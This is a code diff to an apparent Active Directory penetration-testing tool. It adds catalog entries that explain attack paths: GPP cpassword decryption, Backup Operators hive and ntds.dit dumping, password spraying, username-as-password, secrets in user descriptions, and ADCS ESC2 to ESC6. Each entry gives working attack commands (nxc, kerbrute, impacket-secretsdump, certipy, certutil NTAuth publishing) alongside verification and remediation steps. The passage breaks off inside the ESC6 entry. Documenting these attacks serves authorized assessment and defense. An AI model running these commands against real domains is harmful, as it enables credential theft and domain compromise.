@@ -2577,8 +2577,8 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
     ),
     _entry(
         "gpppassword",
-        support_kind="unsupported",
-        support_reason="Not implemented yet in ADscan",
+        support_kind="supported",
+        support_reason="Harvest and decrypt a Group Policy Preferences cpassword from SYSVOL",
         compromise_semantics="direct_target_compromise",
         compromise_effort="low",
         category="entry_vector",
@@ -3648,6 +3648,290 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "Monitor Windows Event ID 4769 with ticket_encryption_type=0x17 (RC4) to detect roasting attempts.",
         ),
     },
+    "gpppassword": {
+        "short": (
+            "{source} can read a Group Policy Preferences XML in SYSVOL whose "
+            "cpassword field is encrypted with a key Microsoft published, so the "
+            "stored credential for {target} decrypts offline."
+        ),
+        "long": (
+            "Group Policy Preferences let administrators push local account "
+            "passwords to domain machines through XML files (Groups.xml, "
+            "Services.xml, ScheduledTasks.xml, DataSources.xml, Printers.xml, "
+            "Drives.xml) stored in SYSVOL. The password is placed in a "
+            "cpassword field and encrypted with AES-256, but Microsoft "
+            "published the static encryption key in its documentation, so the "
+            "value decrypts with no brute-forcing required. SYSVOL is readable "
+            "by every authenticated domain user by design, so any account with "
+            "domain credentials — in this path {source} — can retrieve and "
+            "decrypt the value stored for {target}. Microsoft's MS14-025 "
+            "update (2014) stopped GPP from being used to set NEW passwords, "
+            "but it did not remove or invalidate files created before the "
+            "patch, so an old Groups.xml left in SYSVOL stays exploitable "
+            "indefinitely."
+        ),
+        "manual": (
+            "# Find and pull GPP XML files from SYSVOL (any authenticated user has read access):\n"
+            "nxc smb <dc_ip> -u <user> -p <pass> -M gpp_password\n"
+            "#   (or manually) browse \\\\<domain>\\SYSVOL\\<domain>\\Policies\\...\\ "
+            "for Groups.xml / Services.xml / ScheduledTasks.xml / DataSources.xml / "
+            "Printers.xml / Drives.xml and read the cpassword attribute, then "
+            "decrypt it with the published GPP AES key:\n"
+            "gpp-decrypt <cpassword_blob>"
+        ),
+        "verify_windows": (
+            "Enumerate SYSVOL for leftover GPP files carrying a cpassword "
+            "attribute — any match means a credential is still exposed:\n"
+            "Get-ChildItem \\\\<domain>\\SYSVOL -Recurse -Include Groups.xml,"
+            "Services.xml,ScheduledTasks.xml,DataSources.xml,Printers.xml,"
+            "Drives.xml -ErrorAction SilentlyContinue | Select-String cpassword\n"
+            "# Confirm MS14-025 is applied so no NEW GPP password can be created:\n"
+            "Get-HotFix -Id KB2962486 -ErrorAction SilentlyContinue"
+        ),
+        "verify_linux": (
+            "Read-only SYSVOL scan for GPP files carrying a cpassword "
+            "attribute, no decryption performed:\n"
+            "nxc smb {dc_ip} -u <user> -p <pass> -M gpp_password\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/group-policy-preferences"
+        ),
+        "remediation": (
+            "Find and remove every GPP XML file in SYSVOL that carries a cpassword field (Groups.xml, Services.xml, ScheduledTasks.xml, DataSources.xml, Printers.xml, Drives.xml).",
+            "Confirm MS14-025 (KB2962486) is installed on all domain controllers so Group Policy Preferences can no longer be used to set a new password.",
+            "Rotate every account whose password was ever stored in a GPP file — the exposed value must be treated as permanently compromised, not just removed from SYSVOL.",
+            "Audit Group Policy Objects for any remaining GPP-based credential deployment (scheduled tasks, mapped drives, data sources) and migrate those to Group Managed Service Accounts or LAPS-managed local passwords.",
+        ),
+    },
+    "backupoperatorescalation": {
+        "short": (
+            "Backup Operators membership grants {source} SeBackupPrivilege, which "
+            "lets it read the domain controller's registry hives (SAM, SECURITY, "
+            "SYSTEM) and the NTDS database, recovering credential material up to "
+            "the DC machine account and domain secrets."
+        ),
+        "long": (
+            "The Backup Operators group is granted SeBackupPrivilege so its members "
+            "can back up any file regardless of its ACL, which by design includes "
+            "the registry hives and the ntds.dit database on a domain controller. "
+            "An account that controls a Backup Operators member, in this path "
+            "{source}, can turn that privilege into credential theft in two ways. "
+            "It can read the SECURITY, SYSTEM, and SAM hives remotely and recover "
+            "the local SAM accounts and LSA secrets, including the domain "
+            "controller's own machine-account key. It can also take a shadow copy "
+            "of the system volume, read ntds.dit out of that copy together with the "
+            "SYSTEM hive, and extract every domain credential hash offline. The "
+            "privilege bypasses the file ACL on purpose, so no further "
+            "misconfiguration is needed beyond the group membership itself. That is "
+            "why Backup Operators is treated as a Tier-0 escalation-capable group: "
+            "holding it is one well-known step away from owning the domain."
+        ),
+        "manual": (
+            "# Route 1 - remote registry hive dump (recover local SAM + LSA secrets, "
+            "incl. the DC machine-account key):\n"
+            "nxc smb <dc_ip> -u <user> -p <pass> --sam --lsa\n"
+            "#   (or, Kerberos-only)  impacket-secretsdump -k -no-pass "
+            "<domain>/<user>@<dc_fqdn>\n"
+            "# Route 2 - read ntds.dit via a shadow copy, then extract offline.\n"
+            "#   On the DC (SeBackupPrivilege lets you copy files past their ACL):\n"
+            "#     diskshadow /s shadow.txt     # script creates a shadow, exposes it as a drive\n"
+            "#     robocopy <shadow_drive>:\\Windows\\NTDS . ntds.dit /b\n"
+            "#     reg save HKLM\\SYSTEM SYSTEM\n"
+            "#   Then extract every domain hash offline from the copies:\n"
+            "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
+        ),
+        "verify_windows": (
+            "List who holds Backup Operators (recurse to catch nested groups) and "
+            "confirm the principal actually carries SeBackupPrivilege on a DC:\n"
+            "Get-ADGroupMember -Identity 'Backup Operators' -Recursive |\n"
+            "  Select-Object name, objectClass, distinguishedName\n"
+            "# On the domain controller, check the effective privilege token:\n"
+            "whoami /priv | findstr SeBackupPrivilege\n"
+            "# Inspect the group object directly if needed:\n"
+            "Get-ADGroup -Identity 'Backup Operators' -Properties Members"
+        ),
+        "verify_linux": (
+            "Read-only enumeration of Backup Operators membership over LDAP, no "
+            "privilege exercised:\n"
+            "nxc ldap {dc_ip} -u <user> -p <pass> --groups 'Backup Operators'\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds"
+        ),
+        "remediation": (
+            "Audit Backup Operators membership with Get-ADGroupMember -Identity 'Backup Operators' -Recursive, then remove every account that is not a dedicated, monitored backup service identity — interactive admins and user accounts do not belong in this group.",
+            "If backup software genuinely needs SeBackupPrivilege, scope it to a single dedicated service account running only on the backup host, never to a shared or interactive administrator, and document that account as Tier-0-equivalent.",
+            "Constrain the 'Back up files and directories' user right through Group Policy (Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assignment) so only the intended service principal is granted SeBackupPrivilege on domain controllers.",
+            "Alert on privileged-use of this right: monitor Event ID 4672 (special privileges assigned at logon) for the Backup Operators identity and Event ID 4663 for access to the NTDS directory and the SAM/SECURITY/SYSTEM hives, so any hive or ntds.dit read outside the scheduled backup window is investigated.",
+        ),
+    },
+    "passwordspray": {
+        "short": (
+            "Password spraying tries ONE common password across MANY accounts, "
+            "staying under the lockout threshold, so a single weak or default "
+            "password anywhere in the domain yields a foothold without locking "
+            "anyone out."
+        ),
+        "long": (
+            "Brute-forcing one account trips account lockout within a few "
+            "attempts. Password spraying inverts that: one candidate password "
+            "(a season and year such as Summer2024!, a value like Welcome1, the "
+            "company name, or an empty or default password) is tested against "
+            "the whole user list, with each account tried only once per round. "
+            "Because the rounds are spaced to respect the domain's "
+            "lockoutThreshold and observation window, badPwdCount never climbs "
+            "high enough to lock any single account, so the attack stays quiet "
+            "from the point of view of any one user. Large directories almost "
+            "always contain at least one account whose owner chose a weak or "
+            "never-changed default password, which makes spraying a dependable "
+            "entry vector for an unauthenticated or low-privileged attacker. The "
+            "only prerequisite is a valid list of usernames, and that list is "
+            "cheap to obtain: anonymous or authenticated LDAP enumeration of the "
+            "directory returns every sAMAccountName. In this path {source} uses "
+            "that foothold against {target}."
+        ),
+        "manual": (
+            "# Spray ONE password across a username list. Space the rounds under "
+            "the domain lockout threshold/observation window so no account locks.\n"
+            "# Kerberos pre-auth spray (quieter, AES-friendly, only an AS-REQ per "
+            "user):\n"
+            "kerbrute passwordspray -d <domain> --dc <dc_ip> users.txt 'Season2024!'\n"
+            "#   (or over SMB, continuing past the first hit):\n"
+            "nxc smb <dc_ip> -u users.txt -p 'Season2024!' --continue-on-success"
+        ),
+        "verify_windows": (
+            "Read the lockout policy so you know the spray window the attacker "
+            "must stay under:\n"
+            "Get-ADDefaultDomainPasswordPolicy | "
+            "Select-Object LockoutThreshold, LockoutObservationWindow, LockoutDuration\n"
+            "# Check for fine-grained password policies that override the default:\n"
+            "Get-ADFineGrainedPasswordPolicy -Filter *\n"
+            "# Review failed-logon events for the spray signature (many distinct "
+            "accounts, one source, one password, short window):\n"
+            "Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} -MaxEvents 200 |\n"
+            "  Select-Object TimeCreated, @{n='Account';e={$_.Properties[5].Value}}, "
+            "@{n='Source';e={$_.Properties[19].Value}}"
+        ),
+        "verify_linux": (
+            "Read-only: pull the domain password and lockout policy so you know "
+            "the safe spray window before testing anything:\n"
+            "nxc smb {dc_ip} -u <user> -p <pass> --pass-pol\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/spraying"
+        ),
+        "remediation": (
+            "Enforce a strong password policy and ban common and seasonal passwords: where Azure AD Password Protection (or an on-prem banned-password list) is available, deploy it to reject values like Welcome1 and Summer2024!, and audit the current baseline with Get-ADDefaultDomainPasswordPolicy.",
+            "Set a sane Account Lockout Policy via GPO (Computer Configuration > Policies > Windows Settings > Security Settings > Account Policies > Account Lockout Policy): a lockout threshold with an observation window long enough to blunt spraying, tuned against lockout-denial-of-service so a spray cannot trivially lock the whole directory.",
+            "Require multi-factor authentication on every externally reachable service (VPN, webmail, remote access, federation endpoints), so a guessed password alone does not grant access.",
+            "Monitor Security event 4625 (failed logon) and 4771 (Kerberos pre-authentication failure) for the spray signature — many distinct target accounts, a single source, one password, all inside one observation window — and alert on that pattern rather than on per-account failure counts.",
+        ),
+    },
+    "useraspass": {
+        "short": (
+            "The account {target} uses its own username as its password, so a "
+            "single guess — the sAMAccountName itself — authenticates as the "
+            "account."
+        ),
+        "long": (
+            "A common weak-credential class is an account whose password equals "
+            "its username, or a close variant of it. The username is public: "
+            "anonymous or authenticated LDAP enumeration of the directory returns "
+            "every sAMAccountName, so the password is effectively already known "
+            "and no cracking is involved. Testing each account's name as its own "
+            "password across the domain's account list yields a foothold; when "
+            "the attempts are spaced under the lockout observation window, not a "
+            "single account is locked out. This pattern tends to survive on "
+            "service, test, and default accounts that were created quickly and "
+            "never revisited, which is why it stays a dependable entry vector on "
+            "large or loosely maintained directories. In this path {source} uses "
+            "that foothold against {target}."
+        ),
+        "manual": (
+            "# Try each account's own name as its password (user == pass) across "
+            "the whole user list.\n"
+            "# --no-bruteforce pairs line N of -u with line N of -p, so each "
+            "account is tested only with its own name (one attempt per account). "
+            "Space the rounds under the domain lockout threshold/observation "
+            "window so no account locks:\n"
+            "nxc smb <dc_ip> -u users.txt -p users.txt --no-bruteforce --continue-on-success\n"
+            "#   (quieter Kerberos pre-auth variant, only an AS-REQ per user):\n"
+            "kerbrute bruteuser -d <domain> --dc <dc_ip> --user-as-pass users.txt"
+        ),
+        "verify_windows": (
+            "Read the lockout policy so you know the window a spray must stay "
+            "under:\n"
+            "Get-ADDefaultDomainPasswordPolicy | "
+            "Select-Object LockoutThreshold, LockoutObservationWindow, LockoutDuration\n"
+            "# Surface the likely stale/service accounts this pattern tends to "
+            "hide on, for a targeted credential audit:\n"
+            "Get-ADUser -Filter {Enabled -eq $true} "
+            "-Properties PasswordLastSet, ServicePrincipalName |\n"
+            "  Select-Object SamAccountName, PasswordLastSet, ServicePrincipalName\n"
+            "# Review failed-logon events for the spray signature (many distinct "
+            "accounts, one source, one observation window):\n"
+            "Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} -MaxEvents 200"
+        ),
+        "verify_linux": (
+            "Read-only confirmation that each account's name is NOT accepted as "
+            "its password (--no-bruteforce tests user == pass only):\n"
+            "nxc smb {dc_ip} -u users.txt -p users.txt --no-bruteforce\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/spraying"
+        ),
+        "remediation": (
+            "Enforce a password policy that rejects the username or account name as a password: where Azure AD Password Protection (or an on-prem banned-password list) is available, add the account-name and its common variants to the banned list, and audit the current baseline with Get-ADDefaultDomainPasswordPolicy.",
+            "Run a credential audit to find accounts whose password equals their username and force a reset with Set-ADAccountPassword followed by Set-ADUser -ChangePasswordAtLogon $true, prioritizing service, test, and default accounts, which carry this pattern most often.",
+            "Set an Account Lockout Policy via GPO (Computer Configuration > Policies > Windows Settings > Security Settings > Account Policies > Account Lockout Policy): a lockout threshold with an observation window long enough to blunt a spaced spray, tuned so a spray cannot trivially lock the whole directory.",
+            "Require multi-factor authentication on every externally reachable service (VPN, webmail, remote access, federation endpoints) so a guessed name-as-password does not by itself grant access.",
+            "Monitor Security event 4625 (failed logon) and 4771 (Kerberos pre-authentication failure) for the spray signature — many distinct target accounts from a single source inside one observation window — and alert on that pattern rather than on per-account failure counts.",
+        ),
+    },
+    "userdescription": {
+        "short": (
+            "A plaintext credential is stored in {target}'s LDAP description or "
+            "info attribute, which any authenticated — and often any anonymous — "
+            "directory read returns, so the password is disclosed directly with "
+            "no cracking needed."
+        ),
+        "long": (
+            "Administrators sometimes record a password, a temporary password, or "
+            "a service credential in an account's description or info attribute "
+            "for convenience. Those attributes are readable by every "
+            "authenticated domain user by default, and on some domains by "
+            "anonymous binds as well, so the secret is disclosed in cleartext to "
+            "anyone who enumerates the directory. ADscan reads these attributes "
+            "over LDAP and verifies any recovered value against the domain to "
+            "confirm a working login. No privilege escalation or cracking is "
+            "required: the credential is simply sitting in a world-readable "
+            "field. It stays a low-effort entry vector on domains with loose "
+            "hygiene, and in this path {source} uses a value recovered this way "
+            "against {target}."
+        ),
+        "manual": (
+            "# Read the description/info attribute of every account over LDAP and "
+            "look for anything password-shaped:\n"
+            "nxc ldap <dc_ip> -u <user> -p <pass> -M user-desc\n"
+            "#   (or a raw LDAP read of the same attributes):\n"
+            "ldapsearch -x -H ldap://<dc_ip> -b \"<baseDN>\" \"(description=*)\" "
+            "sAMAccountName description info\n"
+            "# Then authenticate with any recovered value to confirm it works:\n"
+            "nxc smb <dc_ip> -u <recovered_user> -p <recovered_pass>"
+        ),
+        "verify_windows": (
+            "Enumerate accounts carrying a description or info value and review "
+            "each for anything password-shaped:\n"
+            "Get-ADUser -Filter {Description -like \"*\"} "
+            "-Properties Description, info |\n"
+            "  Select-Object SamAccountName, Description, info"
+        ),
+        "verify_linux": (
+            "Read-only read of the description/info attributes, no authentication "
+            "attempt made against recovered values:\n"
+            "nxc ldap {dc_ip} -u <user> -p <pass> -M user-desc\n"
+            "# Reference: https://www.thehacker.recipes/ad/recon/ldap"
+        ),
+        "remediation": (
+            "Audit every account's description and info attribute for stored secrets with Get-ADUser -Filter {Description -like \"*\"} -Properties Description, info | Select-Object SamAccountName, Description, info, and review each result by hand for anything password-shaped.",
+            "For every credential found, clear the attribute (Set-ADUser -Identity <account> -Clear Description, info) and rotate the exposed password immediately with Set-ADAccountPassword — the value must be treated as compromised, not merely hidden.",
+            "Train administrators never to store passwords in directory attributes, and document an approved secrets store (a privileged-access or secrets-management system) as the only place service credentials belong.",
+            "Where feasible, tighten read access on sensitive attributes: remove anonymous LDAP read (dsHeuristics), and review the default authenticated-users read ACL on accounts that carry sensitive descriptive data.",
+            "Schedule the description/info audit to run on a recurring basis so a newly added secret is caught quickly, and alert on directory reads of these attributes via Event ID 4662 where object auditing is enabled.",
+        ),
+    },
     "asreproasting": {
         "short": "ASREPRoasting: {target} has pre-authentication disabled, so {source} can request an AS-REP and crack it offline.",
         "long": (
@@ -3902,6 +4186,29 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "#   nxc equivalent:\n"
             "nxc smb <dc_ip> -u {source} -p <pass> -M change-password "
             "-o USER={target} NEWPASS='Newpass123!'"
+        ),
+        "verify_windows": (
+            "Confirm the finding by reading {target}'s ACL for the "
+            "User-Force-Change-Password extended right "
+            "(rightsGuid 00299570-246d-11d0-a768-00aa006e0529) granted to "
+            "{source}. A matching ACE means the reset right is real and no "
+            "password is changed by this check:\n"
+            "dsacls \"<target DN>\"   # look for 'CONTROL ACCESS ... Reset "
+            "Password' granted to {source}\n"
+            "# Or, with the RSAT ActiveDirectory module:\n"
+            "(Get-Acl \"AD:\\<target DN>\").Access |\n"
+            "  Where-Object { $_.ObjectType -eq "
+            "'00299570-246d-11d0-a768-00aa006e0529' -and "
+            "$_.IdentityReference -match '{source}' }"
+        ),
+        "verify_linux": (
+            "Read {target}'s DACL for the User-Force-Change-Password ACE "
+            "(no password change performed):\n"
+            "nxc ldap {dc_ip} -u <user> -p <pass> -M daclread "
+            "-o TARGET={target} ACTION=read\n"
+            "#   (or) bloodyAD --host {dc_ip} -d <domain> -u <user> -p <pass> "
+            "get object {target} --attr nTSecurityDescriptor\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"
         ),
         "remediation": (
             "Remove the User-Force-Change-Password extended right from {source} on {target}.",
@@ -4195,6 +4502,2891 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "account rather than a sysadmin login.",
         ),
     },
+    "adcsesc2": {
+        "short": (
+            "ADCS ESC2: {source} can enroll in certificate template {template}, "
+            "which grants the Any Purpose EKU (or no EKU at all), so the issued "
+            "certificate can be used to authenticate as any user."
+        ),
+        "long": (
+            "ADCS ESC2 abuses a certificate template whose extended key usage is "
+            "either the Any Purpose OID (2.5.29.37.0) or empty. A certificate "
+            "with no usage restriction can be presented for client authentication, "
+            "so {source_type} {source} — who holds enrollment rights on {template} "
+            "and faces no manager approval and no enrollment-agent signature "
+            "requirement — can request a certificate and then use it to log in as "
+            "another identity. Unlike ESC1 the subject is not supplied by the "
+            "requester; the escalation instead depends on how the certificate is "
+            "later mapped to an account (for example paired with a weak "
+            "certificate-to-account mapping), which lets the attacker pivot toward "
+            "{target}."
+        ),
+        "manual": (
+            "# Enumerate ADCS and confirm the template is ESC2-vulnerable:\n"
+            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-vulnerable -stdout\n"
+            "# Request a certificate from the Any-Purpose template, then "
+            "authenticate with it:\n"
+            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-ca <ca_name> -template {template}\n"
+            "certipy auth -pfx {source}.pfx -dc-ip <dc_ip>"
+        ),
+        "verify_windows": (
+            "Confirm {template} grants the Any Purpose EKU (or no EKU) and lets a "
+            "low-privileged principal enroll without manager approval:\n"
+            "certutil -v -template {template} |\n"
+            "  Select-String -Pattern 'Any Purpose', 'Extended Key Usage', "
+            "'msPKI-Enrollment-Flag', 'msPKI-RA-Signature'\n"
+            "# List the enrollment ACL on the template object:\n"
+            "Get-ADObject -LDAPFilter '(cn={template})' -SearchBase "
+            "\"CN=Certificate Templates,CN=Public Key Services,CN=Services,"
+            "$((Get-ADRootDSE).configurationNamingContext)\" -Properties nTSecurityDescriptor"
+        ),
+        "verify_linux": (
+            "Read-only ADCS enumeration; confirm {template} is flagged ESC2 "
+            "(no request issued):\n"
+            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-vulnerable -stdout\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
+        ),
+        "remediation": (
+            "Remove the Any Purpose EKU from {template} and assign only the "
+            "specific extended key usages the template legitimately needs; a "
+            "template used for authentication should carry a restricted EKU set, "
+            "never Any Purpose or an empty EKU list.",
+            "Require CA manager approval (set the CT_FLAG_PEND_ALL_REQUESTS "
+            "enrollment flag) so a certificate is never issued automatically from "
+            "this template.",
+            "Restrict enrollment permissions on {template} to only the identities "
+            "that must request it, and remove enrollment rights from broad groups "
+            "such as Domain Users and Authenticated Users.",
+            "Apply the KB5014754 strong certificate mapping enforcement on domain "
+            "controllers so a certificate cannot be silently mapped to a "
+            "higher-privileged account.",
+        ),
+    },
+    "adcsesc3": {
+        "short": (
+            "ADCS ESC3: {source} can enroll in the enrollment-agent template "
+            "{template}, obtain a Certificate Request Agent certificate, and then "
+            "request certificates on behalf of any other user."
+        ),
+        "long": (
+            "ADCS ESC3 abuses a certificate template that carries the Certificate "
+            "Request Agent EKU (1.3.6.1.4.1.311.20.2.1). The attack has two halves. "
+            "First, {source_type} {source} enrolls in the agent template — it has "
+            "enrollment rights, no manager approval, and no enrollment-agent "
+            "signature requirement — and receives an enrollment-agent certificate. "
+            "Second, the attacker uses that agent certificate to co-sign a request "
+            "on a second template that permits enrollment-on-behalf-of, minting a "
+            "client-authentication certificate for a privileged target. "
+            "Authenticating with that certificate via PKINIT then impersonates the "
+            "target and compromises {target}."
+        ),
+        "manual": (
+            "# Enumerate and confirm the enrollment-agent template is vulnerable:\n"
+            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-vulnerable -stdout\n"
+            "# 1) Get an enrollment-agent certificate from the agent template:\n"
+            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-ca <ca_name> -template {template}\n"
+            "# 2) Use the agent cert to request a cert AS a privileged user, then auth:\n"
+            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-ca <ca_name> -template User -pfx {source}.pfx -on-behalf-of "
+            "'<domain>\\administrator'\n"
+            "certipy auth -pfx administrator.pfx -dc-ip <dc_ip>"
+        ),
+        "verify_windows": (
+            "Confirm {template} grants the Certificate Request Agent EKU and is "
+            "enrollable without approval:\n"
+            "certutil -v -template {template} |\n"
+            "  Select-String -Pattern 'Certificate Request Agent', "
+            "'1.3.6.1.4.1.311.20.2.1', 'msPKI-Enrollment-Flag', "
+            "'msPKI-RA-Signature'\n"
+            "# Check which templates accept an enrollment-agent co-signature "
+            "(msPKI-RA-Application-Policies references the agent EKU):\n"
+            "Get-ADObject -SearchBase \"CN=Certificate Templates,CN=Public Key "
+            "Services,CN=Services,$((Get-ADRootDSE).configurationNamingContext)\" "
+            "-LDAPFilter '(objectClass=pKICertificateTemplate)' -Properties "
+            "msPKI-RA-Application-Policies"
+        ),
+        "verify_linux": (
+            "Read-only ADCS enumeration; confirm the agent template is flagged "
+            "ESC3 (no certificate requested):\n"
+            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-vulnerable -stdout\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
+        ),
+        "remediation": (
+            "Restrict enrollment on the enrollment-agent template {template} to a "
+            "small, explicitly approved set of certificate-management operators; "
+            "remove enrollment rights from Domain Users and Authenticated Users.",
+            "Require CA manager approval on {template} so an enrollment-agent "
+            "certificate is never issued automatically.",
+            "On the CA, configure enrollment-agent restrictions (Restricted "
+            "Enrollment Agents on the Enrollment Agents tab in the CA properties) "
+            "so an agent certificate can only enroll for a defined set of "
+            "templates and target principals.",
+            "Audit every template that accepts an enrollment-agent signature and "
+            "remove the on-behalf-of capability where it is not required.",
+        ),
+    },
+    "adcsesc4": {
+        "short": (
+            "ADCS ESC4: {source} holds write access over certificate template "
+            "{template}, so it can rewrite the template's configuration into an "
+            "ESC1-style misconfiguration and then enroll to impersonate a "
+            "privileged user."
+        ),
+        "long": (
+            "ADCS ESC4 is a control-plane weakness: {source_type} {source} holds a "
+            "write-equivalent right (GenericAll, GenericWrite, WriteDacl, "
+            "WriteOwner, or Owns) over the certificate template object {template}. "
+            "Any of these lets the attacker modify the template's attributes — for "
+            "example enabling ENROLLEE_SUPPLIES_SUBJECT, adding a client "
+            "authentication EKU, granting itself enrollment rights, and clearing "
+            "the manager-approval flag — which turns the template into the ESC1 "
+            "condition. The attacker then enrolls, supplies a privileged subject, "
+            "and authenticates with the issued certificate to compromise {target}. "
+            "Write access on the template alone is sufficient; no pre-existing "
+            "template flag is required."
+        ),
+        "manual": (
+            "# Confirm the write-access finding on the template:\n"
+            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-vulnerable -stdout\n"
+            "# Reconfigure the template into ESC1 (enrollee-supplies-subject + "
+            "client auth), then restore it afterward:\n"
+            "certipy template -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-template {template} -write-default-configuration\n"
+            "# Then enroll supplying a privileged SAN and authenticate:\n"
+            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-ca <ca_name> -template {template} -upn administrator@<domain>\n"
+            "certipy auth -pfx administrator.pfx -dc-ip <dc_ip>"
+        ),
+        "verify_windows": (
+            "List the ACL on {template} and confirm a non-privileged principal "
+            "holds a write-equivalent right (GenericAll / GenericWrite / WriteDacl "
+            "/ WriteOwner):\n"
+            "$cfg = (Get-ADRootDSE).configurationNamingContext\n"
+            "$tmpl = Get-ADObject -LDAPFilter '(cn={template})' -SearchBase "
+            "\"CN=Certificate Templates,CN=Public Key Services,CN=Services,$cfg\"\n"
+            "(Get-Acl \"AD:$($tmpl.DistinguishedName)\").Access |\n"
+            "  Where-Object { $_.ActiveDirectoryRights -match "
+            "'GenericAll|GenericWrite|WriteDacl|WriteOwner' } |\n"
+            "  Format-Table IdentityReference, ActiveDirectoryRights"
+        ),
+        "verify_linux": (
+            "Read-only ADCS enumeration; confirm {template} is flagged ESC4 with "
+            "the write principal listed (no template modified):\n"
+            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-vulnerable -stdout\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/access-controls"
+        ),
+        "remediation": (
+            "Remove the excessive write rights on {template} — using dsacls or "
+            "Set-Acl on the template object, revoke GenericAll / GenericWrite / "
+            "WriteDacl / WriteOwner from any non-Tier-0 principal so only PKI "
+            "administrators can modify it.",
+            "Set the template owner to a Tier-0 PKI administration group rather "
+            "than an ordinary user or an over-broad group.",
+            "After removing the rights, inspect {template} for any ESC1-style "
+            "changes the attacker may already have applied (enrollee-supplies-"
+            "subject, added client-auth EKU, relaxed approval) and restore the "
+            "intended secure configuration.",
+            "Audit the ACLs of every certificate template and PKI container with "
+            "Get-Acl / dsacls and treat template write access as a Tier-0 privilege.",
+        ),
+    },
+    "adcsesc5": {
+        "short": (
+            "ADCS ESC5: {source} holds write access over a PKI infrastructure "
+            "object ({target}), letting it tamper with the CA trust configuration "
+            "and forge or trust attacker-controlled certificates."
+        ),
+        "long": (
+            "ADCS ESC5 covers write-level control (GenericAll, GenericWrite, "
+            "WriteDacl, WriteOwner, or Owns) over the high-value PKI objects that "
+            "underpin certificate trust: the NTAuthStore (which lists the CAs "
+            "trusted for domain client authentication), the Root CA and AIA CA "
+            "objects, and the Enterprise CA object itself. {source_type} {source} "
+            "with such a right on {target} can, for example, publish an "
+            "attacker-controlled CA into NTAuth so that certificates it issues are "
+            "trusted for logon, or otherwise reconfigure the CA to mint "
+            "authentication certificates for privileged identities. Because these "
+            "objects govern the whole PKI trust chain, compromising one is "
+            "equivalent to controlling certificate-based authentication across the "
+            "domain."
+        ),
+        "manual": (
+            "# Enumerate ADCS and confirm the write-on-PKI-object finding:\n"
+            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-vulnerable -stdout\n"
+            "# With write on NTAuth, publish an attacker CA cert so its certs are "
+            "trusted for logon (then remove it afterward):\n"
+            "certutil -dspublish -f attacker_ca.crt NTAuthCA"
+        ),
+        "verify_windows": (
+            "List the ACL on the PKI object and confirm a non-Tier-0 principal "
+            "holds write access. For the NTAuth store:\n"
+            "$cfg = (Get-ADRootDSE).configurationNamingContext\n"
+            "(Get-Acl \"AD:CN=NTAuthCertificates,CN=Public Key Services,"
+            "CN=Services,$cfg\").Access |\n"
+            "  Where-Object { $_.ActiveDirectoryRights -match "
+            "'GenericAll|GenericWrite|WriteDacl|WriteOwner' } |\n"
+            "  Format-Table IdentityReference, ActiveDirectoryRights\n"
+            "# List the CAs currently trusted for authentication:\n"
+            "certutil -viewstore -enterprise NTAuth"
+        ),
+        "verify_linux": (
+            "Read-only ADCS enumeration; confirm the PKI object write finding "
+            "(nothing published):\n"
+            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-vulnerable -stdout\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/access-controls"
+        ),
+        "remediation": (
+            "Restrict the ACL on the affected PKI object ({target}) so only Tier-0 "
+            "PKI administrators hold write access; use dsacls / Set-Acl to revoke "
+            "GenericAll / GenericWrite / WriteDacl / WriteOwner from every other "
+            "principal.",
+            "Review the NTAuth store with certutil -viewstore -enterprise NTAuth "
+            "and remove any CA certificate that should not be trusted for domain "
+            "authentication.",
+            "Set the owner of each PKI container (NTAuthStore, Root CA, AIA, "
+            "Enterprise CA) to a Tier-0 group and treat these objects as part of "
+            "the identity control plane.",
+            "Enable auditing on the PKI containers so any future change to their "
+            "ACL or contents is logged and alerted on.",
+        ),
+    },
+    "adcsesc6": {
+        "short": (
+            "ADCS ESC6: the CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set, so "
+            "{source} can request a certificate from an authentication template "
+            "and inject an arbitrary subject alternative name to impersonate any "
+            "user."
+        ),
+        "long": (
+            "ADCS ESC6 is a CA-wide misconfiguration: the certification authority "
+            "has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled in its policy flags, which "
+            "lets a requester specify an arbitrary subject alternative name (SAN) "
+            "as a request attribute regardless of the template's settings. That "
+            "makes ESC6 effectively an ESC1 that applies to EVERY authentication "
+            "template the CA issues, not just a specific misconfigured one. "
+            "{source_type} {source}, holding enrollment rights on any client "
+            "authentication template with no manager approval, requests a "
+            "certificate while supplying a privileged UPN in the SAN attribute, "
+            "then authenticates with it via PKINIT to compromise {target}."
+        ),
+        "manual": (
